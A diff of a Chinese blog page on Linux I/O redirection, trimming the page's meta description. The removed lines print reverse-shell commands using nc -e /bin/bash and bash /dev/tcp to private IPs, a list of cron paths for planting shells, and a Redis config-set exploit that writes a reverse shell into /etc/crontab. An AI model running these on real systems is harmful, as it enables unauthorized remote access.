@@ -14,49 +14,7 @@
 
   0 标准输入
   1 标准输出
-  2 标准错误输出
-
-输出重定向
-&amp;gt;  默认为标准输出重定向，与 1&amp;gt; 相同
-2&amp;gt;&amp;amp;1  意思是把 标准错误输出 重定向到 标准输出.
-&amp;amp;&amp;gt;file  意思是把标准输出 和 标准错误输出 都重定向到文件file中
-
-
-
-忽略输出
-
-12&amp;gt;&amp;#x2F;dev&amp;#x2F;null
-
-输入重定向
-
-123command &amp;lt;file	将 file 文件中的内容作为 command 的输入。command &amp;lt;&amp;lt;END	从标准输入（键盘）中读取数据，直到遇见分界符 END 才停止（分界符可以是任意的字符串，用户自己定义）。command &amp;lt;file1 &amp;gt;file2	将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。
-反弹shell
-1.靶机监听 将bash发布出去，攻击机直连
-靶机：nc -lvvp 8080 -t -e /bin/bash
-攻击机：nc 192.168.31.41 8080
-
-2.bash直接反弹
-bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.41/8080 0&amp;gt;&amp;amp;1
-
-bash -i &amp;gt;&amp;amp; 中的&amp;amp;表示在后台中运行
-
-
-3.netcat工具反弹
-攻击机：nc -lvvp 8080
-靶机：nc 192.168.31.174 8080 -t -e /bin/bash
-
-crontab反弹shell
-
-利用位置
-
-/etc/crontab linux通用
-/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。
-/var/spool/cron/root centos系统下root用户的cron文件
-/var/spool/cron/crontabs/root debian系统下root用户的cron文件
-
-
-exp
-1234set 1 &amp;quot;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.227.128&amp;#x2F;2333 0&amp;gt;&amp;amp;1\n\n\n\n&amp;quot; config set dir &amp;#x2F;etc&amp;#x2F; config set dbfilename crontab save"> 
+  2 标准错误输出"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -170,6 +128,8 @@ exp
 <pre><code>  0 标准输入
   1 标准输出
   2 标准错误输出</code></pre>
+<a id="more"></a>
+
 <ul>
 <li><p>输出重定向</p>
 <pre><code>&gt;  默认为标准输出重定向，与 1&gt; 相同
